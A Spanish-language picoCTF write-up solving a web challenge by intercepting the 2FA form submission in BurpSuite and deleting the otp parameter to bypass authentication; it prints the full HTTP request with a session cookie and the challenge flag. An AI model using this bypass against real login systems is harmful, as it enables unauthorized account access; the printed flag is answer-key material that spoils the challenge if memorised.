# **Descripción**

#### Description

Try [here](http://titan.picoctf.net:63437/) to find the flag
# **Solución**

Para esta solución, se utilizó la herramienta BurpSuite para interceptar las solicitudes de la página web dada en la descripción.

Al inicio, la página nos muestra un formulario a llenar con datos para registrarnos.

```
## Registration

Full Name: Christian   
  
Username: OG922
  
Phone Number: 1234567890  
  
City: Zacatecas
  
Password: ******

Register
```

Al ingresar estos datos nos muestra ahora otro formulario para autenticación de dos factores.

```
## 2fa authentication
________________________
 Submit
```

Si le damos cualquier código, como un 123 y le damos submit, cuando interceptemos esta solicitud en el Burpsuite, nos aparece lo siguiente.

```Burpsuite
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:51581
Content-Length: 8
Cache-Control: max-age=0
Accept-Language: es-419,es;q=0.9
Origin: http://titan.picoctf.net:51581
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:51581/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw1jL0OwiAURt-F2YFSKODq4Oju0txLL2ljCw0_Mcb47tJEx-98OefN3FJe7Mzu4KCQg8xOzOXkxxIfFNrRTeit69Eb7RVZLZ1GBT2i6CxIjkryQctON8_XdR0DbNS0y5yWXBYIjceyN2KNkVy2uUPOz5imIy56qQ40x0BjqBtS-uNBG8vbVzOlX_R2tUKwzxezXTW6.Z-9RDg.XefMy8E1aZDGlynvP50HV66G_c8
Connection: keep-alive

otp=1234
```

Siendo lo último la variable OTP, es decir el código de autenticación.

Eliminamos esta variable y procedemos a mandar la solicitud.

De esta manera, el resultado que nos arroja la página es el siguiente

```
Welcome, OG922 you sucessfully bypassed the OTP request. Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_3e3ddc76}
```

Consiguiendo así la bandera.

# **Notas adicionales**


# **Referencias**